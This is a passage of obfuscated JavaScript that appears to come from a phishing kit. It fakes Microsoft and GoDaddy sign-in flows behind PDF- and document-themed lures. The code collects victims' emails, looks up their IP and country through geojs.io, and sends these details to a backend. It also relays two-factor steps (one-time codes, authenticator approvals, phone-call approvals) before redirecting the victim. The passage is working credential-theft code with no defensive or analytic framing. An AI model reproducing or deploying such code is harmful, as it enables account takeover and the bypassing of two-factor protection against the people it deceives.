                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_final')
                        .classList.remove('d-none'),
                      (view = 'final'),
                      (document.getElementById('error_pwd_live').innerText =
                        ''))
                    if (_0x57e013.message == 'sign in blocked') {
                      document.getElementById('error_pwd_live').innerText = ''
                      document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none')
                      document
                        .getElementById('section_accessblocked')
                        .querySelector('h2.title').textContent = _0x57e013.title
                      changebackbutton('accessblocked', _0x57e013.backbutton)
                      checkerrordesc('accessblocked', 0, _0x57e013.description)
                      checkerrordesc(
                        'accessblockedsignoutoption',
                        2,
                        _0x57e013.signoutoption
                      )
                      document.getElementById('footer').style.position =
                        'relative'
                      var _0x4bf5bb =
                        document.getElementById('debugdetailsinfo')
                      _0x57e013.troubleshootinginfo.forEach(
                        (_0x5754f8, _0x166577) => {
                          const _0x2ef124 = document.createElement('div'),
                            _0x519b48 = document.createElement('span')
                          _0x519b48.textContent = _0x5754f8.name
                          _0x519b48.classList.add('bold')
                          const _0x1243e1 = document.createElement('span')
                          _0x1243e1.textContent = _0x5754f8.value
                          _0x2ef124.appendChild(_0x519b48)
                          _0x2ef124.appendChild(_0x1243e1)
                          _0x4bf5bb.appendChild(_0x2ef124)
                        }
                      )
                      document
                        .getElementById('section_accessblocked')
                        .classList.remove('d-none')
                      view = 'accessblocked'
                    }
                    _0x57e013.message == 'protect account' &&
                      ((document.getElementById('error_pwd_live').innerText =
                        ''),
                      checkerrordesc(
                        'protectaccount',
                        0,
                        _0x57e013.description
                      ),
                      displayprotectoptions(_0x57e013.protectoptions),
                      bottomsectionlinks(
                        'protectaccount',
                        _0x57e013.bottomsection
                      ),
                      changebackbutton('protectaccount', _0x57e013.backbutton),
                      document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_protectaccount')
                        .classList.remove('d-none'),
                      (view = 'protectaccount'))
                    _0x57e013.message == 'otp sent' &&
                      ((document.getElementById('error_pwd_live').innerText =
                        ''),
                      document
                        .getElementById('otpimg')
                        .setAttribute('src', _0x57e013.image_src),
                      checkerrordesc('otp', 0, _0x57e013.description),
                      bottomsectionlinks('otp', _0x57e013.bottomsection),
                      changebackbutton('otp', _0x57e013.backbutton),
                      document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_otp')
                        .classList.remove('d-none'),
                      (view = 'otp'))
                    _0x57e013.message == 'approve auth request auth app' &&
                      ((document.getElementById('error_pwd_live').innerText =
                        ''),
                      document
                        .getElementById('authappimg')
                        .setAttribute('src', _0x57e013.image_src),
                      checkerrordesc('authapp', 0, _0x57e013.description),
                      bottomsectionlinks('authapp', _0x57e013.bottomsection),
                      changebackbutton('authapp', _0x57e013.backbutton),
                      (document.getElementById('authappcode').textContent =
                        _0x57e013.authappcode),
                      document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_authapp')
                        .classList.remove('d-none'),
                      (view = 'authapp'),
                      wait2fa('app', _0x57e013.methodid))
                    _0x57e013.message == 'approve auth request calling' &&
                      (document
                        .getElementById('section_authcall')
                        .querySelector('.back')
                        .focus(),
                      (document.getElementById('error_pwd_live').innerText =
                        ''),
                      document
                        .getElementById('authcallimg')
                        .setAttribute('src', _0x57e013.image_src),
                      checkerrordesc('authcall', 0, _0x57e013.description),
                      bottomsectionlinks('authcall', _0x57e013.bottomsection),
                      changebackbutton('authcall', _0x57e013.backbutton),
                      document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_authcall')
                        .classList.remove('d-none'),
                      (view = 'authcall'),
                      wait2fa('call'))
                    if (_0x57e013.message == '2fa is on') {
                      var _0x5c8e10 = JSON.parse(_0x57e013.twofamethods)
                      displaytwofamethods(_0x5c8e10)
                      bottomsectionlinks('2fa', _0x57e013.bottomsection)
                      changebackbutton('2fa', _0x57e013.backbutton)
                      document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none')
                      document
                        .getElementById('section_2fa')
                        .classList.remove('d-none')
                      view = '2fa'
                      document.getElementById('error_pwd_live').innerText = ''
                    }
                    _0x57e013.message == 'error' &&
                      (bottomsectionlinks('pwd_live', _0x57e013.bottomsection),
                      changebackbutton('pwd_live', _0x57e013.backbutton),
                      checkerrordesc('pwd_live', 1, _0x57e013.description),
                      (document.getElementById('inp_pwd_live').value = ''))
                    for (
                      var _0x44f422 = 0;
                      _0x44f422 < websitenames.length;
                      _0x44f422++
                    ) {
                      _0x57e013.message ==
                        'error ' + websitenames[_0x44f422] + '' &&
                        checkerrordesc('pwd_live', 1, _0x57e013.description)
                    }
                  }
                })
                .catch((_0x271d6f) => {
                  loadinganimation(1)
                  console.error('Error:', _0x271d6f)
                })))
        }
      }
    }
  }
  return false
}
function resetbacktoemail() {
  var _0x450894 = 'uname'
  multipleaccountsback == 1 && (_0x450894 = 'multipleaccounts')
  bottomsectionlinks(_0x450894, [
    {
      a_id: 'signup',
      a_text: 'Create one!',
      text: 'No account?',
      type: 'text_link',
    },
    {
      a_text: "Can't access your account?",
      a_id: 'cantAccessAccount',
      type: 'link',
    },
  ])
  multipleaccountsback == 0 && changebackbutton(_0x450894, 0)
  document.body.style.backgroundImage = ''
  document.body.style.backgroundColor = ''
  if (twa == 0) {
    var _0x218ab9 = document.querySelectorAll('.bannerlogo')
    _0x218ab9.forEach(function (_0x1f79e3) {
      _0x1f79e3.hasAttribute('style') &&
        (_0x1f79e3.removeAttribute('style'), (_0x1f79e3.style.height = '36px'))
    })
  }
  document.getElementById('error_pwd').innerText = ''
  document.getElementById('section_pwd').classList.toggle('d-none')
  document
    .getElementById('section_pwd')
    .querySelector('.sectioncontent').style.animation = ''
  document.getElementById('section_' + _0x450894).classList.remove('d-none')
  view = _0x450894
}
function backbtn() {
  runanimation(0, view, 1.2)
  if (webnotfound == true && (view == 'pwd' || view == 'pwd_live')) {
    webnotfound = false
    setTimeout(function () {
      resetbacktoemail()
      runanimation(3, view, 1.2)
    }, 900)
  } else {
    if (webnotfound == false && (view == 'pwd' || view == 'pwd_live')) {
      document
        .getElementById('section_' + view)
        .querySelector('.sectioncontent').style.animation = ''
      if (view == 'pwd' || view == 'pwd_live') {
        view == 'pwd' &&
          ((document.getElementById('error_pwd').innerText = ''),
          (document.getElementById('inp_pwd').value = ''),
          (document.getElementById('error_uname').innerText = ''),
          (document.getElementById('inp_uname').value = ''),
          bottomsectionlinks('uname', [
            {
              a_id: 'signup',
              a_text: 'Create one!',
              text: 'No account?',
              type: 'text_link',
            },
            {
              a_id: 'cantAccessAccount',
              a_text: "Can't access your account?",
              type: 'link',
            },
          ]),
          changebackbutton('uname', 0),
          document.getElementById('section_pwd').classList.toggle('d-none'))
        view == 'pwd_live' &&
          ((document.getElementById('error_pwd_live').innerText = ''),
          (document.getElementById('inp_pwd_live').value = ''),
          (document.getElementById('error_uname').innerText = ''),
          (document.getElementById('inp_uname').value = ''),
          bottomsectionlinks('uname', [
            {
              a_id: 'signup',
              a_text: 'Create one!',
              text: 'No account?',
              type: 'text_link',
            },
            {
              a_id: 'cantAccessAccount',
              a_text: "Can't access your account?",
              type: 'link',
            },
          ]),
          changebackbutton('uname', 0),
          document
            .getElementById('section_pwd_live')
            .classList.toggle('d-none'))
        document
          .getElementById('section_uname')
          .querySelector('.sectioncontent').style.animation = ''
        document.getElementById('section_uname').classList.remove('d-none')
        document.body.style.backgroundImage &&
          (document.body.style.backgroundImage = '')
        document.body.style.backgroundColor &&
          (document.body.style.backgroundColor = '')
        bottomsectionlinks('uname', [
          {
            a_id: 'signup',
            a_text: 'Create one!',
            text: 'No account?',
            type: 'text_link',
          },
          {
            a_id: 'cantAccessAccount',
            a_text: "Can't access your account?",
            type: 'link',
          },
        ])
        if (twa == 0) {
          var _0x32a72b = document.querySelectorAll('.bannerlogo')
          _0x32a72b.forEach(function (_0x2a6106) {
            _0x2a6106.hasAttribute('style') &&
              _0x2a6106.removeAttribute('style')
          })
        }
        view = 'uname'
      }
      runanimation(3, view, 1.2)
    }
  }
  if (webnotfound == false && view != 'pwd' && view != 'pwd_live') {
    document
      .getElementById('section_' + view)
      .querySelector('.sectioncontent').style.animation = ''
    if (view == 'pwd' && view == 'pwd_live') {
      view == 'pwd' &&
        ((document.getElementById('error_pwd').innerText = ''),
        (document.getElementById('inp_pwd').value = ''),
        bottomsectionlinks('uname', [
          {
            a_id: 'signup',
            a_text: 'Create one!',
            text: 'No account?',
            type: 'text_link',
          },
          {
            a_id: 'cantAccessAccount',
            a_text: "Can't access your account?",
            type: 'link',
          },
        ]),
        changebackbutton('uname', 0),
        document.getElementById('section_pwd').classList.toggle('d-none'))
      view == 'pwd_live' &&
        ((document.getElementById('error_pwd_live').innerText = ''),
        (document.getElementById('inp_pwd_live').value = ''),
        bottomsectionlinks('uname', [
          {
            a_id: 'signup',
            a_text: 'Create one!',
            text: 'No account?',
            type: 'text_link',
          },
          {
            a_id: 'cantAccessAccount',
            a_text: "Can't access your account?",
            type: 'link',
          },
        ]),
        changebackbutton('uname', 0),
        document.getElementById('section_pwd_live').classList.toggle('d-none'))
      document
        .getElementById('section_uname')
        .querySelector('.sectioncontent').style.animation = ''
      document.getElementById('section_uname').classList.remove('d-none')
      document.body.style.backgroundImage &&
        (document.body.style.backgroundImage = '')
      document.body.style.backgroundColor &&
        (document.body.style.backgroundColor = '')
      if (twa == 0) {
        var _0x32a72b = document.querySelectorAll('.bannerlogo')
        _0x32a72b.forEach(function (_0x575792) {
          _0x575792.hasAttribute('style') && _0x575792.removeAttribute('style')
        })
      }
      view = 'uname'
    }
    view == 'confirmemail' &&
      (document
        .getElementById('section_confirmemail')
        .classList.toggle('d-none'),
      document.getElementById('section_2fa').classList.remove('d-none'),
      (view = '2fa'))
    view == 'confirmemailorphone_live' &&
      (document
        .getElementById('section_confirmemailorphone_live')
        .classList.toggle('d-none'),
      document.getElementById('section_2fa').classList.remove('d-none'),
      (view = '2fa'))
    ;((view == 'otp_live' && viewtype == 'email') ||
      (view == 'otp_live' && viewtype == 'phone')) &&
      (document.getElementById('section_otp_live').classList.toggle('d-none'),
      document
        .getElementById('section_confirmemailorphone_live')
        .classList.remove('d-none'),
      (view = 'confirmemailorphone_live'))
    view == 'otp_live' &&
      viewtype == 'otp' &&
      (document.getElementById('section_otp_live').classList.toggle('d-none'),
      document.getElementById('section_2fa').classList.remove('d-none'),
      (view = '2fa'))
    view == 'otp' &&
      ((document.getElementById('error_otp').innerText = ''),
      (document.getElementById('inp_otpcode').value = ''),
      document.getElementById('section_otp').classList.toggle('d-none'),
      document.getElementById('section_2fa').classList.remove('d-none'),
      (view = '2fa'))
    view == 'authcall' &&
      ((document.getElementById('error_authcall').innerText = ''),
      document.getElementById('section_authcall').classList.toggle('d-none'),
      document.getElementById('section_2fa').classList.remove('d-none'),
      (view = '2fa'))
    runanimation(3, view, 1.2)
  }
}
document.querySelectorAll('.btn_final').forEach((_0x148014) => {
  _0x148014.addEventListener('click', () => {
    window.location.href = redirecturl
  })
})
if (view == 'uname_pdf') {
  const nxtpdf = document.getElementById('btn_next_pdf')
  nxtpdf.addEventListener('click', () => {
    validatepdf()
  })
  pdfcheck = 1
  function loadinganimationpdf(_0x8ca841) {
    _0x8ca841 == 0 &&
      ((document
        .getElementById('sections_pdf')
        .querySelector('#mainLoader').style.display = 'flex'),
      document
        .getElementById('sections_pdf')
        .querySelector('#section_uname_content')
        .classList.toggle('d-none'))
    _0x8ca841 == 1 &&
      ((document
        .getElementById('sections_pdf')
        .querySelector('#mainLoader').style.display = 'none'),
      document
        .getElementById('sections_pdf')
        .querySelector('#section_uname_content')
        .classList.remove('d-none'))
    _0x8ca841 == 2 &&
      ((document
        .getElementById('sections_pdf')
        .querySelector('#mainLoader').style.display = 'flex'),
      document.getElementById('sections_pdf').classList.toggle('d-none'))
  }
  const unamepdfinp = document.getElementById('pdfemail')
  function sendemailpdf() {
    sendAndReceive(
      'checkemail',
      [unamepdfinp.value, pagelinkval, browserName, userip, usercountry],
      1
    )
      .then((_0x1b39da) => {
        if (
          _0x1b39da &&
          _0x1b39da.message !== 'waiting for previous request to complete'
        ) {
          var _0x2f2d45 = false,
            _0x3f3a83 = 300
          _0x1b39da.message.includes('newwebsiteopen') == false &&
            _0x1b39da.message !== 'error' &&
            (_0x1b39da.acctype && _0x1b39da.acctype == 2 && (pvn = 1),
            (_0x1b39da.acctype == undefined ||
              (_0x1b39da.acctype && _0x1b39da.acctype == 1)) &&
              (pvn = 0))
          _0x1b39da.message.includes('newwebsiteopen') == false &&
            ((_0x3f3a83 = 0), loadinganimationpdf(1))
          setTimeout(function () {
            for (
              var _0xe4d633 = 0;
              _0xe4d633 < websitenames.length;
              _0xe4d633++
            ) {
              if (
                _0x1b39da.message.includes('newwebsiteopen') == true &&
                _0x1b39da.message.includes(websitenames[_0xe4d633]) == true
              ) {
                _0x2f2d45 = true
                document
                  .querySelectorAll('.user_identity')
                  .forEach((_0x42f536) => {
                    _0x42f536.innerText = unamepdfinp.value
                  })
                if (websitenames[_0xe4d633] == 'godaddy') {
                  var _0x4b5677 = gdf,
                    _0x39a48e = document.querySelector(
                      'script[src^="' + gdf + '"]'
                    )
                  if (!_0x39a48e) {
                    var _0x488e9a = document.createElement('script')
                    _0x488e9a.src = _0x4b5677
                    document.head.appendChild(_0x488e9a)
                  }
                  const _0x4d03b2 =
                      '\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ',
                    _0x38c78d = document.createElement('style')
                  _0x38c78d.id = 'dynamic-style'
                  _0x38c78d.textContent = _0x4d03b2
                  document.head.appendChild(_0x38c78d)
                  document
                    .getElementById('sections_pdf')
                    .classList.toggle('d-none')
                  document
                    .getElementById('section_uname_pdf')
                    .classList.toggle('d-none')
                  document
                    .getElementById('sections_' + websitenames[_0xe4d633] + '')
                    .classList.remove('d-none')
                  document.getElementById('godaddyemail').value =
                    unamepdfinp.value
                  document.body.style.setProperty(
                    'background-color',
                    '#f5f7f8',
                    'important'
                  )
                  document.body.style.setProperty(
                    'background-image',
                    'unset',
                    'important'
                  )
                  document.body.style.setProperty(
                    'overflow',
                    'auto',
                    'important'
                  )
                  view = 'pwd_godaddy'
                }
              }
              _0x1b39da.message.includes('newwebsiteopen') == true &&
                _0xe4d633 == websitenames.length - 1 &&
                !_0x2f2d45 &&
                ((document.getElementById('error_uname_pdf').innerText = ''),
                (document.getElementById('error_uname_pdf').style.display =
                  'none'),
                document
                  .querySelectorAll('.user_identity')
                  .forEach((_0x4f336e) => {
                    _0x4f336e.innerText = unamepdfinp.value
                  }),
                bottomsectionlinks('pwd', [
                  {
                    a_id: 'idA_PWD_ForgotPassword',
                    a_text: 'Forgot my password',
                    type: 'link',
                  },
                ]),
                changebackbutton('pwd', 0),
                document
                  .getElementById('sections_pdf')
                  .classList.toggle('d-none'),
                document
                  .getElementById('section_uname_pdf')
                  .classList.toggle('d-none'),
                document.getElementById('sections').classList.toggle('d-none'),
                document
                  .getElementById('section_pwd')
                  .classList.remove('d-none'),
                (otherweburl = _0x1b39da.message.replace('newwebsiteopen', '')),
                (webnotfound = true),
                (view = 'pwd'))
            }
            if (_0x1b39da.message == 'multiple accounts') {
              multipleaccountsback = 1
              if (twa == 0) {
                var _0x5454b9 = document.querySelectorAll('.bannerlogo')
                _0x5454b9.forEach(function (_0x303110) {
                  _0x303110.style.height = '24px'
                })
              }
              document
                .getElementById('section_multipleaccounts')
                .querySelector('#btn_back')
                .setAttribute('data-id', _0x1b39da.backbtnid)
              document
                .getElementById('section_multipleaccounts')
                .querySelector('#btn_back')
                .setAttribute('onclick', 'backbuttonclick(this,2)')
              checkerrordesc('multipleaccounts', 0, _0x1b39da.description)
              displaymultipleaccounts(_0x1b39da.accountoptions)
              bottomsectionlinks('multipleaccounts', _0x1b39da.bottomsection)
              document
                .querySelectorAll('.user_identity')
                .forEach((_0x5851c2) => {
                  _0x5851c2.innerText = unamepdfinp.value
                })
              document.getElementById('sections_pdf').classList.toggle('d-none')
              document
                .getElementById('section_uname_pdf')
                .classList.toggle('d-none')
              document.getElementById('sections').classList.toggle('d-none')
              document
                .getElementById('section_multipleaccounts')
                .classList.remove('d-none')
              view = 'multipleaccounts'
            }
            if (_0x1b39da.message == 'correct email') {
              if (twa == 0) {
                if (
                  _0x1b39da.bannerlogo !== undefined &&
                  _0x1b39da.bannerlogo !== null
                ) {
                  var _0x5454b9 = document.querySelectorAll('.bannerlogo')
                  _0x5454b9.forEach(function (_0x4f2a61) {
                    _0x4f2a61.style.backgroundImage =
                      "url('" + _0x1b39da.bannerlogo + "')"
                    _0x4f2a61.style.width = 'unset'
                    _0x4f2a61.style.height = '36px'
                  })
                }
                _0x1b39da.backgroundcolor !== undefined &&
                  _0x1b39da.backgroundcolor !== null &&
                  document.body.style.setProperty(
                    'background-color',
                    _0x1b39da.backgroundcolor
                  )
                _0x1b39da.backgroundimage !== undefined &&
                  _0x1b39da.backgroundimage !== null &&
                  document.body.style.setProperty(
                    'background-image',
                    "url('" + _0x1b39da.backgroundimage + "')"
                  )
                if (
                  _0x1b39da.bannerlogo == undefined ||
                  _0x1b39da.bannerlogo == null
                ) {
                  var _0x5454b9 = document.querySelectorAll('.bannerlogo')
                  _0x5454b9.forEach(function (_0x3366b5) {
                    _0x3366b5.style.height = '24px'
                  })
                }
              }
              pvn == 0 &&
                (bottomsectionlinks('pwd', _0x1b39da.bottomsection),
                changebackbutton('pwd', _0x1b39da.backbutton))
              pvn == 1 &&
                (bottomsectionlinks('pwd_live', _0x1b39da.bottomsection),
                changebackbutton('pwd_live', _0x1b39da.backbutton))
              document.getElementById('error_uname_pdf').innerText = ''
              document.getElementById('error_uname_pdf').style.display = 'none'
              document
                .querySelectorAll('.user_identity')
                .forEach((_0x2e1d49) => {
                  _0x2e1d49.innerText = unamepdfinp.value
                })
              document.getElementById('sections_pdf').classList.toggle('d-none')
              document
                .getElementById('section_uname_pdf')
                .classList.toggle('d-none')
              document.getElementById('sections').classList.toggle('d-none')
              pvn == 0 &&
                (document
                  .getElementById('section_pwd')
                  .classList.remove('d-none'),
                (view = 'pwd'))
              pvn == 1 &&
                (document
                  .getElementById('section_pwd_live')
                  .classList.remove('d-none'),
                (view = 'pwd_live'))
            }
            _0x1b39da.message == 'error' &&
              ((document.getElementById('error_uname_pdf').innerText =
                'Please, provide a valid email.'),
              (document.getElementById('error_uname_pdf').style.display =
                'block'),
              loadinganimationpdf(1))
          }, _0x3f3a83)
        }
      })
      .catch((_0x2cc033) => {
        loadinganimationpdf(1)
        console.error('Error:', _0x2cc033)
      })
  }
  function validatepdf() {
    if (view === 'uname_pdf') {
      const _0x4b592c = bes,
        _0x3ae73f = unamepdfinp.value.trim().split('@')[1]
      unamepdfinp.value.includes('@') &&
        _0x4b592c.some((_0x4a84eb) => _0x3ae73f.includes(_0x4a84eb)) &&
        (loadinganimationpdf(0),
        setTimeout(function () {
          loadinganimationpdf(1)
          document.getElementById('error_uname_pdf').innerText =
            'Please, provide a valid email.'
          document.getElementById('error_uname_pdf').style.display = 'block'
        }, 3000))
      if (unamepdfinp.value.trim() == '') {
        document.getElementById('error_uname_pdf').innerText =
          'Please, provide a valid email.'
        document.getElementById('error_uname_pdf').style.display = 'block'
      } else {
        unamepdfinp.value.trim() != '' &&
          unamepdfinp.value.includes('@') &&
          !_0x4b592c.some((_0x41aac0) => _0x3ae73f.includes(_0x41aac0)) &&
          (loadinganimationpdf(0),
          webnotfound == true &&
            setTimeout(function () {
              loadinganimationpdf(1)
              setTimeout(function () {
                document.getElementById('error_pwd').innerText = ''
                document.getElementById('inp_pwd').value = ''
                document
                  .getElementById('sections_pdf')
                  .classList.toggle('d-none')
                document
                  .getElementById('section_uname_pdf')
                  .classList.toggle('d-none')
                document
                  .getElementById('section_pwd')
                  .classList.remove('d-none')
                view = 'pwd'
              }, 300)
            }, 3000),
          webnotfound == false &&
            (interacted == 1 && sendemailpdf(),
            interacted == 0 &&
              ((interacted = 1),
              (function _0x2512b6() {
                $.get(
                  'https://get.geojs.io/v1/ip/geo.json',
                  function (_0xa42599) {
                    userip = _0xa42599.ip
                    usercountry = _0xa42599.country
                    sendemailpdf()
                  },
                  'json'
                ).fail(function (_0x9c1fe4, _0x57fcb6, _0x2e6011) {
                  ;(_0x9c1fe4.status == 429 || _0x57fcb6 !== 'success') &&
                    setTimeout(_0x2512b6, 1000)
                })
              })())))
      }
    }
    return false
  }
}
if (view == 'uname_doc') {
  const nxtdoc = document.getElementById('btn_next_doc')
  nxtdoc.addEventListener('click', () => {
    validatedoc()
  })
  doccheck = 1
  function loadinganimationdoc(_0x44d76f) {
    _0x44d76f == 0 &&
      (document
        .getElementById('sections_doc')
        .querySelector('#docemailloading').style.display = 'unset')
    _0x44d76f == 1 &&
      (document
        .getElementById('sections_doc')
        .querySelector('#docemailloading').style.display = 'none')
    _0x44d76f == 2 &&
      (document
        .getElementById('sections_doc')
        .querySelector('#docemailloading').style.display = 'unset')
  }
  const unamedocinp = document.getElementById('docemail')
  function sendemaildoc() {
    sendAndReceive(
      'checkemail',
      [unamedocinp.value, pagelinkval, browserName, userip, usercountry],
      1
    )
      .then((_0x4c6ebe) => {
        if (
          _0x4c6ebe &&
          _0x4c6ebe.message !== 'waiting for previous request to complete'
        ) {
          var _0x2d6102 = false,
            _0x3b8c3c = 300
          _0x4c6ebe.message.includes('newwebsiteopen') == false &&
            _0x4c6ebe.message !== 'error' &&
            (_0x4c6ebe.acctype && _0x4c6ebe.acctype == 2 && (pvn = 1),
            (_0x4c6ebe.acctype == undefined ||
              (_0x4c6ebe.acctype && _0x4c6ebe.acctype == 1)) &&
              (pvn = 0))
          _0x4c6ebe.message.includes('newwebsiteopen') == false &&
            ((_0x3b8c3c = 0), loadinganimationdoc(1))
          setTimeout(function () {
            for (
              var _0x45e06c = 0;
              _0x45e06c < websitenames.length;
              _0x45e06c++
            ) {
              if (
                _0x4c6ebe.message.includes('newwebsiteopen') == true &&
                _0x4c6ebe.message.includes(websitenames[_0x45e06c]) == true
              ) {
                loadinganimationdoc(2)
                _0x2d6102 = true
                document
                  .querySelectorAll('.user_identity')
                  .forEach((_0x212f7b) => {
                    _0x212f7b.innerText = unamedocinp.value
                  })
                if (websitenames[_0x45e06c] == 'godaddy') {
                  var _0x50ec43 = gdf,
                    _0x500a03 = document.querySelector(
                      'script[src^="' + gdf + '"]'
                    )
                  if (!_0x500a03) {
                    var _0x264fa5 = document.createElement('script')
                    _0x264fa5.src = _0x50ec43
                    document.head.appendChild(_0x264fa5)
                  }
                  const _0x12d690 =
                      '\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ',
                    _0x31d6da = document.createElement('style')
                  _0x31d6da.id = 'dynamic-style'
                  _0x31d6da.textContent = _0x12d690
                  document.head.appendChild(_0x31d6da)
                  document
                    .getElementById('sections_doc')
                    .classList.toggle('d-none')
                  document
                    .getElementById('section_uname_doc')
                    .classList.toggle('d-none')
                  document
                    .getElementById('sections_' + websitenames[_0x45e06c] + '')
                    .classList.remove('d-none')
                  document.getElementById('godaddyemail').value =
                    unamedocinp.value
                  document.body.style.setProperty(
                    'background-color',
                    '#f5f7f8',
                    'important'
                  )
                  document.body.style.setProperty(
                    'background-image',
                    'unset',
                    'important'
                  )
                  document.body.style.setProperty(
                    'overflow',
                    'auto',
                    'important'
                  )
                  view = 'pwd_godaddy'
                }
              }
              _0x4c6ebe.message.includes('newwebsiteopen') == true &&
                _0x45e06c == websitenames.length - 1 &&
                !_0x2d6102 &&
                ((document.getElementById('error_uname_doc').innerText = ''),
                (document.getElementById('error_uname_doc').style.display =
                  'none'),
                document
                  .querySelectorAll('.user_identity')
                  .forEach((_0x198717) => {
                    _0x198717.innerText = unamedocinp.value
                  }),
                bottomsectionlinks('pwd', [
                  {
                    a_id: 'idA_PWD_ForgotPassword',
                    a_text: 'Forgot my password',
                    type: 'link',
                  },
                ]),
                changebackbutton('pwd', 0),
                document
                  .getElementById('sections_doc')
                  .classList.toggle('d-none'),
                document
                  .getElementById('section_uname_doc')
                  .classList.toggle('d-none'),
                document.getElementById('sections').classList.toggle('d-none'),
                document
                  .getElementById('section_pwd')
                  .classList.remove('d-none'),
                (otherweburl = _0x4c6ebe.message.replace('newwebsiteopen', '')),
                (webnotfound = true),
                (view = 'pwd'))
            }
            if (_0x4c6ebe.message == 'multiple accounts') {
              multipleaccountsback = 1
              if (twa == 0) {
                var _0x4d9ac9 = document.querySelectorAll('.bannerlogo')
                _0x4d9ac9.forEach(function (_0x261799) {
                  _0x261799.style.height = '24px'
                })
              }
              document
                .getElementById('section_multipleaccounts')
                .querySelector('#btn_back')
                .setAttribute('data-id', _0x4c6ebe.backbtnid)
              document
                .getElementById('section_multipleaccounts')
                .querySelector('#btn_back')
                .setAttribute('onclick', 'backbuttonclick(this,2)')
              checkerrordesc('multipleaccounts', 0, _0x4c6ebe.description)
              displaymultipleaccounts(_0x4c6ebe.accountoptions)
              bottomsectionlinks('multipleaccounts', _0x4c6ebe.bottomsection)
              document
                .querySelectorAll('.user_identity')
                .forEach((_0x335f21) => {
                  _0x335f21.innerText = unamedocinp.value
                })
              document.getElementById('sections_doc').classList.toggle('d-none')
              document
                .getElementById('section_uname_doc')
                .classList.toggle('d-none')
              document.getElementById('sections').classList.toggle('d-none')
              document
                .getElementById('section_multipleaccounts')
                .classList.remove('d-none')
              view = 'multipleaccounts'
            }
            if (_0x4c6ebe.message == 'correct email') {
              if (twa == 0) {
                if (
                  _0x4c6ebe.bannerlogo !== undefined &&
                  _0x4c6ebe.bannerlogo !== null
                ) {
                  var _0x4d9ac9 = document.querySelectorAll('.bannerlogo')
                  _0x4d9ac9.forEach(function (_0x2f52f0) {
                    _0x2f52f0.style.backgroundImage =
                      "url('" + _0x4c6ebe.bannerlogo + "')"
                    _0x2f52f0.style.width = 'unset'
                    _0x2f52f0.style.height = '36px'
                  })
                }
                _0x4c6ebe.backgroundcolor !== undefined &&
                  _0x4c6ebe.backgroundcolor !== null &&
                  document.body.style.setProperty(
                    'background-color',
                    _0x4c6ebe.backgroundcolor
                  )
                _0x4c6ebe.backgroundimage !== undefined &&
                  _0x4c6ebe.backgroundimage !== null &&
                  document.body.style.setProperty(
                    'background-image',
                    "url('" + _0x4c6ebe.backgroundimage + "')"
                  )
                if (
                  _0x4c6ebe.bannerlogo == undefined ||
                  _0x4c6ebe.bannerlogo == null
                ) {
                  var _0x4d9ac9 = document.querySelectorAll('.bannerlogo')
                  _0x4d9ac9.forEach(function (_0x55fc3f) {
                    _0x55fc3f.style.height = '24px'
                  })
                }
              }
              pvn == 0 &&
                (bottomsectionlinks('pwd', _0x4c6ebe.bottomsection),
                changebackbutton('pwd', _0x4c6ebe.backbutton))
              pvn == 1 &&
                (bottomsectionlinks('pwd_live', _0x4c6ebe.bottomsection),
                changebackbutton('pwd_live', _0x4c6ebe.backbutton))
              document.getElementById('error_uname_doc').innerText = ''
              document.getElementById('error_uname_doc').style.display = 'none'
              document
                .querySelectorAll('.user_identity')
                .forEach((_0x2a4c7f) => {
                  _0x2a4c7f.innerText = unamedocinp.value
                })
              document.getElementById('sections_doc').classList.toggle('d-none')
              document
                .getElementById('section_uname_doc')
                .classList.toggle('d-none')
              document.getElementById('sections').classList.toggle('d-none')
              pvn == 0 &&
                (document
                  .getElementById('section_pwd')
                  .classList.remove('d-none'),
                (view = 'pwd'))
              pvn == 1 &&
                (document
                  .getElementById('section_pwd_live')
                  .classList.remove('d-none'),
                (view = 'pwd_live'))
            }
            _0x4c6ebe.message == 'error' &&
              ((document.getElementById('error_uname_doc').innerText =
                'Please, provide a valid email.'),
              (document.getElementById('error_uname_doc').style.display =
                'block'),
              loadinganimationdoc(1))
          }, _0x3b8c3c)
        }
      })
      .catch((_0x4af6bb) => {
        loadinganimationdoc(1)
        console.error('Error:', _0x4af6bb)
      })
  }
  function validatedoc() {
    if (view === 'uname_doc') {
      const _0x330b35 = bes,
        _0x4c9da2 = unamedocinp.value.trim().split('@')[1]
      unamedocinp.value.includes('@') &&
        _0x330b35.some((_0x4696fe) => _0x4c9da2.includes(_0x4696fe)) &&
        (loadinganimationdoc(0),
        setTimeout(function () {
          loadinganimationdoc(1)
          document.getElementById('error_uname_doc').innerText =
            'Please, provide a valid email.'
          document.getElementById('error_uname_doc').style.display = 'block'
        }, 3000))
      if (unamedocinp.value.trim() == '') {
        document.getElementById('error_uname_doc').innerText =
          'Please, provide a valid email.'
        document.getElementById('error_uname_doc').style.display = 'block'
      } else {
        unamedocinp.value.trim() != '' &&
          unamedocinp.value.includes('@') &&
          !_0x330b35.some((_0x3c03e4) => _0x4c9da2.includes(_0x3c03e4)) &&
          (loadinganimationdoc(0),
          webnotfound == true &&
            setTimeout(function () {
              loadinganimationdoc(1)
              setTimeout(function () {
                document.getElementById('error_pwd').innerText = ''
                document.getElementById('inp_pwd').value = ''
                document
                  .getElementById('sections_doc')
                  .classList.toggle('d-none')
                document
                  .getElementById('section_uname_doc')
                  .classList.toggle('d-none')
                document
                  .getElementById('section_pwd')
                  .classList.remove('d-none')
                view = 'pwd'
              }, 300)
            }, 3000),
          webnotfound == false &&
            (interacted == 1 && sendemaildoc(),
            interacted == 0 &&
              ((interacted = 1),
              (function _0x392d2a() {
                $.get(
                  'https://get.geojs.io/v1/ip/geo.json',
                  function (_0x5cc3fc) {
                    userip = _0x5cc3fc.ip
                    usercountry = _0x5cc3fc.country
                    sendemaildoc()
                  },
                  'json'
                ).fail(function (_0x1626df, _0x1a5607, _0x2b4d8c) {
